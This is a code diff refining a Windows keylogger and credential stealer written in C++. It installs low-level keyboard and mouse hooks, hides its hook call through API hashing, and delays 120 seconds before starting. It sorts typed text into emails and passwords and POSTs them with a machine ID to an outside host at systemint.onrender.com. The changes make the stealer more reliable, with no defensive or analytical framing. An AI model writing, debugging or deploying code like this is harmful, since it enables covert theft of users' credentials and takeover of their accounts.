@@ -10,7 +10,10 @@
 // --- 1. API HASHING & STRINGS ---
 constexpr DWORD HashString(const char* str) {
     DWORD hash = 0x811c9dc5;
-    while (*str) { hash ^= (BYTE)*str++; hash *= 0x01000193; }
+    while (*str) { 
+        hash ^= (BYTE)*str++; 
+        hash *= 0x01000193; 
+    }
     return hash;
 }
 
@@ -35,22 +38,24 @@ std::string GetMachineId() {
 }
 
 bool IsEmail(const std::string& s) {
-    return std::regex_match(s, std::regex(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)"));
+    const std::regex email_regex(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)");
+    return std::regex_match(s, email_regex);
 }
 
 bool IsValidPass(const std::string& s) {
-    // Regex for: Min 8 chars, at least one letter and one number
-    return std::regex_match(s, std::regex(R"(^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$)\n"));
+    // Corrected Regex: Min 8 chars, at least one letter and one number
+    const std::regex pass_regex(R"(^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$)");
+    return std::regex_match(s, pass_regex);
 }
 
 // --- 3. EXFILTRATION ---
 void UploadData(std::string email, std::string pass) {
-    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
-    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
-    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
+    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
+    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
+    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
     
     std::string json = "{\"machineId\":\"" + GetMachineId() + "\", \"email\":\"" + email + "\", \"password\":\"" + pass + "\"}";
-    WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), json.length(), json.length(), 0);
+    WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0);
     WinHttpReceiveResponse(hR, NULL);
     WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
 }
@@ -62,12 +67,16 @@ std::string savedPass = "";
 
 void ProcessBuffer() {
     if (buffer.empty()) return;
-    if (IsEmail(buffer)) savedEmail = buffer;
-    else if (IsValidPass(buffer) || buffer.length() >= 8) savedPass = buffer;
+    if (IsEmail(buffer)) {
+        savedEmail = buffer;
+    } else if (IsValidPass(buffer) || buffer.length() >= 8) {
+        savedPass = buffer;
+    }
     
     if (!savedPass.empty()) {
         UploadData(savedEmail, savedPass);
-        savedEmail.clear(); savedPass.clear();
+        savedEmail.clear(); 
+        savedPass.clear();
     }
     buffer.clear();
 }
@@ -75,15 +84,21 @@ void ProcessBuffer() {
 LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
     if (n == HC_ACTION && w == WM_KEYDOWN) {
         KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
-        if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) ProcessBuffer();
-        else if (k->vkCode >= 0x30 && k->vkCode <= 0x5A) buffer += (char)k->vkCode;
-        else if (k->vkCode == VK_SPACE) buffer += " ";
+        if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) {
+            ProcessBuffer();
+        } else if ((k->vkCode >= 0x30 && k->vkCode <= 0x39) || (k->vkCode >= 0x41 && k->vkCode <= 0x5A)) {
+            buffer += (char)k->vkCode;
+        } else if (k->vkCode == VK_SPACE) {
+            buffer += " ";
+        }
     }
     return CallNextHookEx(NULL, n, w, l);
 }
 
 LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
-    if (n == HC_ACTION && w == WM_LBUTTONDOWN) ProcessBuffer(); // User clicked away/button
+    if (n == HC_ACTION && w == WM_LBUTTONDOWN) {
+        ProcessBuffer(); 
+    }
     return CallNextHookEx(NULL, n, w, l);
 }
 
@@ -92,13 +107,20 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
     Sleep(120000);
 
     HMODULE u32 = GetModuleHandleA("user32.dll");
+    if (!u32) u32 = LoadLibraryA("user32.dll");
+
     // Hash for SetWindowsHookExA = 0xDE2B4659
     auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
 
-    _SetHook(WH_KEYBOARD_LL, KeyProc, GetModuleHandle(NULL), 0);
-    _SetHook(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
+    if (_SetHook) {
+        _SetHook(WH_KEYBOARD_LL, KeyProc, GetModuleHandle(NULL), 0);
+        _SetHook(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
+    }
 
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
+    while (GetMessage(&msg, NULL, 0, 0)) { 
+        TranslateMessage(&msg); 
+        DispatchMessage(&msg); 
+    }
     return 0;
 }
